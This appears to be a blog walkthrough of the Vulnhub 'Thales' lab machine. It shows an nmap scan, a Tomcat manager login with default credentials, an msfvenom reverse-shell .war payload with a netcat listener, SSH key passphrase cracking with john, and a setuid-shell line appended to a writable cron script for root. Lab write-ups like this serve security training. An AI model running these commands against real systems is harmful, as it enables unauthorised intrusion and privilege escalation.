---
title: Vulnhub Thales Walkthrough
layout: post
categories: [Vulnhub]
tags: [ linux , tomcat ] 
toc: true
image:
  path: "/assets/images/thales/THALES.png"
  alt: Vulnhub Thales
---

## Recon 
### Nmap
Nmap scan gave us ports :

```bash
nmap -p- -sV --open -sC -Pn 192.168.1.14  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-29 07:22 +01
Nmap scan report for kioptrix3.com (192.168.1.14)
Host is up (0.00082s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8c:19:ab:91:72:a5:71:d8:6d:75:1d:8f:65:df:e1:32 (RSA)
|   256 90:6e:a0:ee:d5:29:6c:b9:7b:05:db:c6:82:5c:19:bf (ECDSA)
|_  256 54:4d:7b:e8:f9:7f:21:34:3e:ed:0f:d9:fe:93:bf:00 (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.52
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.52
MAC Address: 08:00:27:F2:3B:39 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Enumeration 
### Web Enum & Exploitation :
#### Authentication to Tomcat Manager
we are presented with an apache tomcate dashboard , when we try to login to `host-manager` we are faced with a `401` response code , so we need to brutefoce it 

we tried default user `tomcat` and password `role1` and we are in :


#### Generate .war Format Backdoor

We can use msfvenom for generating a .war format backdoor for java/jsp payload, all you need to do is just follow the given below syntax to create a .war format file and then run Netcat listener.
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.108 LPORT=1234 -f war > shell.war

```

we start an `netcat ` listener : 
```
nc -lvp 1234
```

## Cracking encrypted thales id_rsa file :
in the `ssh` directory of user thales we find an `id_rsa` private ssh file but when we tried to log in using it we are prompted to enter a password so we need to crack it using `john `

First we will use `ss2john` on the file `id_rsa ` and save the output to a file 

then we run john`` to crack that file :

```bash 
john --wordlist=/usr/share/wordlists/rockyou.txt idcrack 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
vodka06          (id_rsa)     

```

We try switching our user to `thales` using that password `vodka06` , and it worked .

## Privelege Escalation 
Navigating to the home directory of user `thales ` we find an interesting file:
![](/assets/images/thales/2.png)

by viewing the file permissions we noticed :that we can write anything to that file:

![](/assets/images/thales/3.png)


we will copy the `dash` binary using this command :

```
echo "cp /bin/dash /var/tmp/dash; chmod u+s /var/tmp/dash" >> /usr/local/bin/backup.sh
```

we go to `/var/tmp/` and run the `dash` binary to get root with a `-p` flag for executing in privileged context 
```
 ./dash -p
# id
uid=1000(thales) gid=1000(thales) euid=0(root) groups=1000(thales),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

# cat /root/root.txt
3a1c85bebf8833b0ecae900fb8598b17

```
